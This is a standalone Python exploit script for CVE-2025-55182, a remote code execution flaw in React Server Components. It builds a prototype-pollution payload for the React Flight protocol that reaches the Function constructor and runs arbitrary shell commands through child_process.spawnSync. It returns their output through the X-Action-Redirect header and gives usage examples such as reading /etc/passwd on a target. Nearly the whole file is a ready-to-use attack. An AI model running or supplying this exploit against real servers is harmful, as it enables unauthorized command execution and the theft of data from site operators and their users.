#!/usr/bin/env python3
"""
CVE-2025-55182 RCE Exploit
Remote Code Execution exploit for React Server Components (CVE-2025-55182)

Vulnerability Mechanism:

The exploit leverages prototype pollution in React Flight Protocol deserialization.
It pollutes Object.prototype.then via "$1:__proto__:then" and gains Function constructor
access through _formData.get set to "$1:constructor:constructor", then injects malicious
code via _prefix that gets executed by Function().

Usage:
    python3 CVE-2025-55182.py http://target.com:3000 -c "id"
    python3 CVE-2025-55182.py https://target.com -c "whoami" --no-check-ssl
    python3 CVE-2025-55182.py 192.168.1.100:3000 -c "uname -a"
    
Command output is retrieved via NEXT_REDIRECT header (X-Action-Redirect).
"""

import requests
import sys
import argparse
import urllib3
import json
from urllib.parse import urlparse

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def build_payload(command):
    """
    Build RCE payload based on working exploit from Spritualkb
    Uses spawnSync and NEXT_REDIRECT error to get command output
    
    Args:
        command: Command to execute
    """
    # Escape single quotes in command for JavaScript string
    escaped_cmd = command.replace("'", "'\"'\"'")
    
    # Build the prefix payload that executes the command
    # Use spawnSync with shell option for better stability
    # Throw NEXT_REDIRECT error with command output in digest
    prefix_payload = (
        f"var r=process.mainModule.require('child_process').spawnSync('sh',['-c','{escaped_cmd}'],{{encoding:'utf8',timeout:5000}});"
        f"var res=r.stdout||r.stderr||'';"
        f"throw Object.assign(new Error('NEXT_REDIRECT'),"
        f"{{digest:`NEXT_REDIRECT;push;/login?a=${{res.trim()}};307;`}});"
    )
    
    # Malicious fake chunk structure - different from original PoC
    part0 = (
        '{"then":"$1:__proto__:then",'
        '"status":"resolved_model",'
        '"reason":-1,'
        '"value":"{\\"then\\":\\"$B1337\\"}",'
        '"_response":{'
        '"_prefix":"' + prefix_payload + '",'
        '"_chunks":"$Q2",'
        '"_formData":{"get":"$1:constructor:constructor"}'
        '}}'
    )
    
    payload = {
        '0': part0,
        '1': '"$@0"',
        '2': '[]'
    }
    
    return payload

def normalize_url(url):
    """Normalize URL - add http:// if missing, handle IP:PORT format"""
    url = url.strip()
    
    # If no scheme, add http://
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    return url

def exploit(target_url, command, verify_ssl=True, action_id=None, verbose=False):
    """
    Exploit CVE-2025-55182 to execute arbitrary command
    
    Args:
        target_url: Target URL (e.g., http://target.com:3000)
        command: Command to execute
        verify_ssl: Whether to verify SSL certificates
        action_id: Optional Next-Action header value
    """
    target_url = normalize_url(target_url)
    
    # Default action ID from original PoC
    if action_id is None:
        action_id = '409defd89dd31eeb200d9ea02b1f325d25f5f5f3f0'
    
    headers = {
        'Next-Action': action_id,
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15'
    }
    
    payload = build_payload(command)
    
    print(f"[*] Target: {target_url}")
    print(f"[*] Command: {command}")
    if not verify_ssl:
        print("[*] SSL certificate verification disabled")
    print(f"[*] Building payload...")
    
    try:
        # Send POST request with multipart/form-data
        files = {}
        for key, value in payload.items():
            files[key] = (None, value)
        
        print(f"[*] Sending exploit payload...")
        # Use shorter timeout - RCE execution may cause server to hang
        response = requests.post(
            target_url,
            files=files,
            headers=headers,
            verify=verify_ssl,
            timeout=5,  # Short timeout - if code executes, server may hang
            allow_redirects=False
        )
        
        if verbose:
            print(f"[*] Status Code: {response.status_code}")
            print(f"[*] Response Headers: {dict(response.headers)}")
        
        # Check response for command output
        if 'X-Action-Redirect' in response.headers or 'x-action-redirect' in response.headers:
            redirect = response.headers.get('X-Action-Redirect') or response.headers.get('x-action-redirect', '')
            if 'login?a=' in redirect:
                # Extract command output from redirect
                output = redirect.split('login?a=')[1].split(';')[0]
                print(f"\n{'='*60}")
                print(f"[+] Command executed successfully!")
                print(f"{'='*60}")
                print(f"[+] Command Output:")
                print(f"{'-'*60}")
                print(output)
                print(f"{'-'*60}")
                return response
        
        # Check for error-based indicators
        if response.status_code == 500:
            print("[!] Server returned 500 error")
            if 'text/x-component' in response.headers.get('Content-Type', ''):
                print("[+] Content-Type indicates React Flight Protocol response")
            if 'digest' in response.text:
                print("[+] Response contains React error digest (exploitation attempted)")
        
        # Try to extract output from response body
        response_text = response.text
        if 'login?a=' in response_text:
            # Extract from response body
            output = response_text.split('login?a=')[1].split(';')[0]
            print(f"\n{'='*60}")
            print(f"[+] Command output found in response body!")
            print(f"{'='*60}")
            print(f"[+] Command Output:")
            print(f"{'-'*60}")
            print(output)
            print(f"{'-'*60}")
        
        if response_text and verbose:
            print(f"\n[*] Response ({len(response_text)} bytes):")
            print(response_text[:500])
            if len(response_text) > 500:
                print("... (truncated)")
        
        return response
        
    except requests.exceptions.Timeout:
        print("[!] Request timed out")
        print("[+] This may indicate successful code execution!")
        print("[+] Check target server logs for command output")
        print("[+] If using callback URL, check your callback server for output")
        return None
    except requests.exceptions.SSLError as e:
        print(f"[!] SSL Error: {e}")
        print("[!] Try using --no-check-ssl flag")
        return None
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed: {e}")
        return None
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
        import traceback
        traceback.print_exc()
        return None

def main():
    parser = argparse.ArgumentParser(
        description='CVE-2025-55182 RCE Exploit - React Server Components Remote Code Execution',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s http://target.com:3000 -c "id"
  %(prog)s https://target.com -c "whoami" --no-check-ssl
  %(prog)s 192.168.1.100:3000 -c "uname -a"
  %(prog)s http://localhost:3000 -c "cat /etc/passwd"
        """
    )
    
    parser.add_argument('target', help='Target URL or IP:PORT (e.g., http://target.com:3000 or 192.168.1.100:3000)')
    parser.add_argument('-c', '--command', required=True, help='Command to execute on target')
    parser.add_argument('--no-check-ssl', action='store_true', help='Disable SSL certificate verification')
    parser.add_argument('--action-id', help='Custom Next-Action header value (default: from original PoC)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("CVE-2025-55182 RCE Exploit")
    print("React Server Components Remote Code Execution")
    print("=" * 60)
    print()
    
    verify_ssl = not args.no_check_ssl
    
    result = exploit(
        target_url=args.target,
        command=args.command,
        verify_ssl=verify_ssl,
        action_id=args.action_id,
        verbose=args.verbose
    )
    
    if result is None:
        print("\n[!] Exploitation may have succeeded but response was not received")
        print("[!] Check target server logs for command execution")
        sys.exit(1)
    
    print(f"\n{'='*60}")
    print("[*] Exploitation attempt completed")
    print(f"{'='*60}")

if __name__ == '__main__':
    main()

